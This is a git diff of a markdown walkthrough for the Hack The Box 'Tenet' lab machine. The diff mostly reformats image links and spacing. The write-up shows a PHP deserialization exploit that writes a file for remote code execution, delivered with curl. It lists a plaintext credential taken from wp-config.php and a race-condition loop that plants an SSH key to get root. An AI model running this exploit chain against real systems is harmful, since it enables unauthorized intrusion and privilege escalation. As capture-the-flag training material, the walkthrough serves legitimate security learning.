@@ -1,15 +1,17 @@
 # initial access
+
 write host file and visit tenet.htb web page
 
-![](1.png)
+![](./img/1.png)
 he said that the website was in the process of migration.
 and have a file call 'sator.php' (backup)
- 
+
 ```bash
 curl http://$target_ip/sator.php.bak
 ```
 
 the php code given below allow us to control the 'arepo' parameter and unserialize it
+
 ```php
 <?php
 
@@ -41,7 +43,9 @@ $app -> update_db();
 
 ?>
 ```
+
 Basically, this code means that we can control the 'data' parameter and write into some file.So, let's us create a evil class and then replace the 'data' and 'user_file' parameter.
+
 ```php
 <?php
 
@@ -59,27 +63,34 @@ echo serialize($evil_Stream);
 ```bash
 λ  Tenet main ✗ payload=$(php ./poc.php )
 λ  Tenet main ✗ url_encode_payload=$(~/tool/url.sh "$payload")
-λ  Tenet main ✗ curl "10.129.109.204/sator.php?arepo=$url_encode_payload" -v 
+λ  Tenet main ✗ curl "10.129.109.204/sator.php?arepo=$url_encode_payload" -v
 ```
 
 and last, send our payload with curl command
 we have rce on target :D
-![[Pasted image 20230921204943.png]]
+![](./img/20230921204943.png)
+![[Pasted image ./img/20230921204943.png]]
 we can write a simple revshell bash code and url encode it
-![[Pasted image 20230921205220.png]]
-![[Pasted image 20230921205253.png]]
+
+![](./img/20230921205220.png)
+
+![](./img/20230921205253.png)
 
 # shell as neil
-we can found neil cred on wordpress config file (wp-config.php) 
-![[Pasted image 20230921205436.png]]
+
+we can found neil cred on wordpress config file (wp-config.php)
+![](./img/20230921205436.png)
+
 ```bash
 # neil:Opera2112
 ssh neil@$target
 ```
 
 # shell as root
-![[Pasted image 20230921205748.png]]
+
+![](./img/20230921205748.png)
 we can use sudo command with enableSSH.sh script
+
 ```bash
 #!/bin/bash
 
@@ -132,16 +143,17 @@ key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6i
 addKey
 checkAdded
 ```
-basically, he created a temporary file name, then wrote the key to the '/root/.ssh/authorized_keys' 
+
+basically, he created a temporary file name, then wrote the key to the '/root/.ssh/authorized_keys'
 This is a classic race condition. we can write the key before this script.
 
 ```bash
 while true; do for fn in /tmp/ssh-*; do echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRDyP0boak96SlSEeZr0IgcgpFnrkxHIYaeTkuWSW1rYsyVKuoo4idtuIhmHtmlDNKhQS1GwP1iAQRRH8y3EmtIUH3ofvl9qUrdCtP8g2aHtzPGSgj+jB+rzYozNqJI/SzQnBiC5/GrdBDnC+3GqgT/bp20yPhzV4vSuf+07NK9CZni86TPGKLHI6vcbRoPIei13IPQla0cRL8/y72iv14nHcRzntR2fhNC8MClTSBDzXNBratsWyLVfVvgp+KJznxqMJ+k2JpmHCk9eSTblG7x7xzwBa9LVlMsLmlywwjeBHpXgGuBVSA8ZZxNoXTv/thm56/pTR5ZJk8GCS+PT/SF5BT/387/uZ3latWs1G7qlJ78pX2iftEGWgZctVaUc85YgRi9t+XWSVxZKviPe5SARqE3QpL7RbRagl0JXCH+n3A1g8iUWoQ2F92uT4bk7xGovLLjCkS6LJ0StLAE1Egq6ysol5SPYN4Iu3OJMbaI4TePt3Ebe7IumfBL0VxL2s= sh4n4c1@hh" > $fn; done; done
 ```
-![[Pasted image 20230921210815.png]]
+
+![](./img/20230921210815.png)
 
 # wrap up
 
 simple poc python code to get initial acces
-![[Pasted image 20230921213619.png]]
-
+![](./img/20230921213619.png)
